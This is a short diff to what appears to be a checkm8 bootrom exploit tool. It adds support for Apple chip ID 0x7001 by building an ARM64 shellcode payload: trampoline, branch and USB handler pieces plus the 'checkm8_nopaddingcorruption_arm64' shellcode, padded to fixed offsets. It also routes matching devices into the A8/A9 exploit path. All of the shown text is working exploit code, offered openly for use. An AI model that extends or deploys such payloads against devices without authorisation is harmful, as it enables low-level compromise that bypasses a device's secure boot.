@@ -486,6 +486,23 @@ def payload(cpid: int) -> bytes:
             + s7000_handler
         )
 
+    if cpid == 0x7001:
+        t7001_handler = (
+            asm_arm64_x7_trampoline(0x100011EE4)
+            + asm_arm64_branch(0x10, 0x0)
+            + prepare_shellcode("usb_0xA1_2_arm64", this_platform.usb.constants)[4:]
+        )
+        t7001_shellcode = prepare_shellcode(
+            "checkm8_nopaddingcorruption_arm64", checkm8_constants.values
+        )
+        assert len(t7001_shellcode) <= PAYLOAD_OFFSET_ARM64
+        assert len(t7001_handler) <= PAYLOAD_SIZE_ARM64
+        return (
+            t7001_shellcode
+            + b"\0" * (PAYLOAD_OFFSET_ARM64 - len(t7001_shellcode))
+            + t7001_handler
+        )
+
     if cpid == 0x8003:
         s8003_handler = (
             asm_arm64_x7_trampoline(0x10000F1B0)
@@ -760,6 +777,8 @@ def exploit_a8_a9(match=None):
         payload_a8_a9 = payload(0x8003)
     elif "CPID:7000" in device.serial_number:
         payload_a8_a9 = payload(0x7000)
+    elif "CPID:7001" in device.serial_number:
+        payload_a8_a9 = payload(0x7001)
     else:
         payload_a8_a9 = None
 
